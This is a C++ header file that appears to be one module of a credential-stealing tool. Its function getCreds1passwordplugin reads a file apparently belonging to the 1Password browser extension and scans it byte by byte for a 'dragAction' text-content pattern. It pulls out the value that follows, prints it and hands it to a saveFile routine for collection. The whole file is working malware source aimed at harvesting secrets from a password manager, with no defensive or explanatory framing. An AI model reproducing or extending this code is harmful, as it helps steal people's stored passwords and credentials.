#pragma once
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include "../../core/saveFile.h"

int getCreds1passwordplugin(std::string filename) {
    std::ifstream file(filename, std::ios::binary);

    if (!file.is_open()) {
        std::cerr << "Error opening the file." << std::endl;
        return 1;
    }

    std::string searchKeyword = ",\"dragAction\":{\"value\":{\"type\":\"Text\",\"content\":\"";
    std::string foundData;

    while (!file.eof()) {
        char c;
        file.get(c);

        if (c == searchKeyword[foundData.size()]) {
            foundData += c;
            if (foundData == searchKeyword) {
                // We found the search keyword, now collect data until 0x22 or 0x7d is found
                std::vector<unsigned char> extractedData;

                while (!file.eof()) {
                    file.read(reinterpret_cast<char*>(&c), sizeof(c));

                    // Stop when 0x22 (") or 0x7d (}) is found
                    if (c == 0x22 || c == 0x7d) {
                        break;
                    }

                    extractedData.push_back(c);
                }

                // Convert the binary data to a UTF-8 string
                std::string utf8ExtractedData(extractedData.begin(), extractedData.end());

                // Print the extracted UTF-8 string
                std::cout << "Pattern Data: " + utf8ExtractedData << std::endl;

                // Save into file
                saveFile(utf8ExtractedData);

                foundData.clear();
            }
        }
        else {
            foundData.clear();
        }
    }

    file.close();
    return 0;
}
